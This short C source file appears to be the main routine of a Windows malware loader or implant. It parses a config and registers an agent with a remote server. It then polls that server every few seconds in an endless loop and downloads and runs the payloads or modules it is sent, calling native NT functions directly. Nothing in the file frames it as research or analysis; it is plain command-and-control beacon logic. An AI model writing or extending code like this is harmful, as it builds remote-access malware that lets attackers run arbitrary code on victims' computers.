#include "../../includes/core/core.h"
#include "../../includes/loader/loader.h"

LdrInstance *ldr = NULL;



void LdrMain() 
{
#ifdef DEBUG 
	AllocConsole();
#endif
	if(!LdrAllocateCoreStructsAndLoadApis()) {
		DBGA("[!] Failed Allocating structs and apis\n");
		LdrExitThread(0);
	}
	
	DBGA("[*] Allocation done, Parsing config\n");

	if(!ParseConfig()) {
		DBGA("[!] Failed Parsing config\n");
		LdrExitThread(0);
	}
	DBGA("[*] Parsed Config\n");

	if(!LdrRegisterAgent()) {
		LdrExitThread(0);
	}

	LdrInitPoll();
	DBGA("[*] Going into poll Loop\n");
	while(TRUE) {
		LARGE_INTEGER time;
		time.QuadPart = -10000LL * 10000LL;
		DBGA("[*] Sleeping for 5 seconds\n");
		ldr->win32->NtDelayExecution(FALSE, &time);
		LdrTask task = LdrPollServer();
		if(!task.ok) {
			LdrExitThread(0);
		}

		switch(task.code) {
		case TASK_NO_TASK:
			continue;
			break;
		case TASK_LOAD: {
			if(!LdrLoadAndRun(task, FALSE)) 
				LdrExitThread(0);
			break;
		}
		case TASK_MODULE: {
			if(!LdrRunModule(task, FALSE)) 
				LdrExitThread(0);
			break;
		}
			

		}
	}
		
}